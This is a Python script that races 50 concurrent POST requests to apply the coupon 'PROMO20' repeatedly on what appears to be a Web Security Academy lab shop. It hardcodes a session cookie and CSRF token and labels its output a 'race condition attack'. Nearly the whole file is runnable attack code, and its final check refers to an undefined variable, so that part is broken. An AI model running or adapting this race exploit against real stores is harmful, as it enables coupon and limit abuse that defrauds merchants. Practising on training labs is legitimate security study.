import asyncio
import aiohttp
import time

bpc = 1
nc = 50
            
async def blast(session, url, headers, data, task_id, success_counter):
    for i in range(bpc):
        start = time.time()
        try:
            async with session.post(url, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                end = time.time()
                body = await resp.text()
                status = resp.status
                
                # IMPROVED PARSING - check response length and content
                if "Invalid coupon" in body:
                    result = "INVALID"
                elif "Coupon already applied" in body:
                    result = "DUPLICATE"
                else:
                    result = "SUCCESS?"
                    success_counter[0] += 1  # ← CRITICAL FIX
                
                print(f"[{task_id:02d}-{i:02d}] {result} | Time: {(end-start):.3f}s | Len: {len(body)}")
        except asyncio.TimeoutError:
            end = time.time()
            print(f"[{task_id:02d}-{i:02d}] TIMEOUT | Time: {(end-start):.3f}s")
        except Exception as e:
            end = time.time()
            print(f"[{task_id:02d}-{i:02d}] ERROR: {str(e)} | Time: {(end-start):.3f}s")            
                       
async def main():
    url = "https://0acb004103b9c15780113f4c002700e2.web-security-academy.net/cart/coupon"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded", 
        "Cookie": "session=uR3lvHWc24dvFo7yEt8sK4yYDn6zQuMu"
    }
    data = "csrf=fRxBIVld9IEdpCmSIwejrlZYQxq6MRlW&coupon=PROMO20"
    
    success_counter = [0]
    
    print(f"[*] Starting race condition attack at {time.ctime()}")
    print(f"[*] Target: {url}")
    print(f"[*] Concurrent bursts: {nc} connections × {bpc} requests each")
    print(f"[*] Timeout: 3.0s (matching observed server response time)")
    print("-" * 60)
    
    async with aiohttp.ClientSession() as session:
        tasks = [blast(session, url, headers, data, i, success_counter) for i in range(nc)]
        await asyncio.gather(*tasks)
    
    print("-" * 60)
    print(f"[*] Attack completed at {time.ctime()}")
    print(f"[*] SUCCESS? responses: {success_counter[0]}")
    
    # Validation note
    if success_counter[0] >= 2:
        print(f"[!] Note: Cart shows 2 coupons but script detected {success_counter[0]}")
        print(f"[!] Parsing may need refinement - using length {len(body)} as indicator")

if __name__ == "__main__":
    asyncio.run(main())
